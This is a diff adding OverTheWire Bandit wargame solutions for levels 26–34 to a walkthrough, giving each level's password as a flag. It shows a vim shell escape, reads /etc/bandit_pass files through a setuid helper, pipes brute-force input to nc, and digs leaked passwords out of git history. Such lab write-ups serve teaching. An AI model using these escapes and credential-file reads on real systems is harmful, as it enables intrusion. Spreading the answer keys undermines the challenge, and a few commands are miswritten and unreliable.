@@ -914,15 +914,10 @@ for i in range(10000):
 ```
 
 ```bash
-for i in {0:}
-for i in range(10000):
-    print("UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ {:04d}".format(i)) 
-```
-
-```bash
 python3 pwned.py | nc localhost 30002 | sort | uniq
 ```
 
+```
 Correct!
 Exiting.
 I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
@@ -931,3 +926,291 @@ Wrong! Please enter the correct pincode. Try again.
 ```
 
 **Flag**: `uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG`
+
+## Exercise 26
+http://overthewire.org/wargames/bandit/bandit26.html
+
+```
+ssh bandit25@bandit.labs.overthewire.org -p 2220
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+```
+
+https://medium.com/secttp/overthewire-bandit-level-25-4724e2196657
+
+```
+:set shell=/bin/bash
+:shell 
+```
+
+```bash
+cat /etc/bandit_pass/bandit26
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+**Flag:** `5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z`
+
+
+## Exercise 27
+http://overthewire.org/wargames/bandit/bandit27.html
+
+```
+ssh bandit26@bandit.labs.overthewire.org -p 2220
+5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+```
+
+See the previous excercise for how to get a shell
+
+```bash
+./bandit27-do cat /etc/bandit_pass/bandit27
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+**Flag:** `3ba3118a22e93127a4ed485be72ef5ea`
+
+## Exercise 28
+http://overthewire.org/wargames/bandit/bandit28.html
+
+**Login**
+```bash
+ssh bandit27@bandit.labs.overthewire.org -p 2220
+3ba3118a22e93127a4ed485be72ef5ea
+```
+
+**Working**
+```bash
+cd /tmp/me
+git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
+```
+```
+Cloning into 'repo'...
+Could not create directory '/home/bandit27/.ssh'.
+The authenticity of host 'localhost (127.0.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
+This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
+
+bandit27-git@localhost's password: 
+remote: Counting objects: 3, done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 3 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (3/3), done.
+```
+
+```bash
+cat /tmp/me/repo/README
+```
+```
+The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+**Flag:** `0ef186ac70e04ea33b4c1853d2526fa2`
+
+## Exercise 29
+http://overthewire.org/wargames/bandit/bandit29.html
+
+**Login**
+
+```bash
+ssh bandit28@bandit.labs.overthewire.org -p 2220
+0ef186ac70e04ea33b4c1853d2526fa2
+```
+
+**Working**
+
+```bash
+cat README.md
+```
+```
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: xxxxxxxxxx
+```
+```bash
+git log
+```
+```
+git log
+commit 073c27c130e6ee407e12faad1dd3848a110c4f95
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    fix info leak
+
+commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb
+Author: Morla Porla <morla@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    add missing data
+
+commit b67405defc6ef44210c53345fc953e6a21338cc7
+Author: Ben Dover <noone@overthewire.org>
+Date:   Tue Oct 16 14:00:39 2018 +0200
+
+    initial commit of README.md
+```
+```bash
+git checkout 186a1038cc
+```
+```bash
+cat README.md 
+```
+```
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: bbc96594b4e001778eee9975372716b2
+```
+
+**Flag:** `bbc96594b4e001778eee9975372716b2`
+
+## Exercise 30
+http://overthewire.org/wargames/bandit/bandit30.html
+
+**Login**
+
+```bash
+ssh bandit29@bandit.labs.overthewire.org -p 2220
+bbc96594b4e001778eee9975372716b2
+```
+
+**Working**
+
+```bash
+mv /tmp/me
+```
+
+```bash
+git checkout ssh://bandit29-git@localhost/home/bandit29-git/repo
+```
+
+```bash
+cat README.md
+```
+```
+cat README.md 
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+```
+
+```bash
+git log
+```
+```
+commit 84abedc104bbc0c65cb9eb74eb1d3057753e70f8
+Author: Ben Dover <noone@overthewire.org>
+Date:   Tue Oct 16 14:00:41 2018 +0200
+
+    fix username
+
+commit 9b19e7d8c1aadf4edcc5b15ba8107329ad6c5650
+Author: Ben Dover <noone@overthewire.org>
+Date:   Tue Oct 16 14:00:41 2018 +0200
+
+    initial commit of README.md
+```
+
+```bash
+git diff 9b19e7d8c1 84abedc104
+```
+```bash
+diff --git a/README.md b/README.md
+index 2da2f39..1af21d3 100644
+--- a/README.md
++++ b/README.md
+@@ -3,6 +3,6 @@ Some notes for bandit30 of bandit.
+ 
+ ## credentials
+ 
+-- username: bandit29
++- username: bandit30
+ - password: <no passwords in production!>
+```
+
+Nothing in master branch. What about another branch?
+
+```bash
+git branch -r
+```
+```
+  origin/HEAD -> origin/master
+  origin/dev
+  origin/master
+  origin/sploits-dev
+```
+
+```bash
+git checkout -b dev
+```
+```bash
+cat README.md
+```
+```
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: 5b90576bedb2cc04c86a9e924ce42faf
+```
+
+**Flag**: `5b90576bedb2cc04c86a9e924ce42faf`
+
+## Exercise 31
+http://overthewire.org/wargames/bandit/bandit31.html
+
+**Login**
+
+```bash
+ssh bandit30@bandit.labs.overthewire.org -p 2220
+5b90576bedb2cc04c86a9e924ce42faf
+```
+
+**Working**
+
+https://medium.com/secttp/overthewire-bandit-level-30-7ee3996ce583
+
+**Flag**: `47e603bb428404d265f59c42920d81e5`
+
+## Exercise 32
+http://overthewire.org/wargames/bandit/bandit32.html
+
+**Login**
+
+```bash
+ssh bandit31@bandit.labs.overthewire.org -p 2220
+47e603bb428404d265f59c42920d81e5
+```
+
+**Flag:** `56a9bf19c63d650ce78e6ec0354ee45e`
+
+## Exercise 33
+http://overthewire.org/wargames/bandit/bandit33.html
+
+```bash
+ssh bandit32@bandit.labs.overthewire.org -p 2220
+56a9bf19c63d650ce78e6ec0354ee45e
+```
+
+**Flag**: `c9c3199ddf4121b10cf581a98d51caee`
+
+## Exercise 34
+http://overthewire.org/wargames/bandit/bandit34.html
+
+```bash
+ssh bandit33@bandit.labs.overthewire.org -p 2220
+c9c3199ddf4121b10cf581a98d51caee
+```
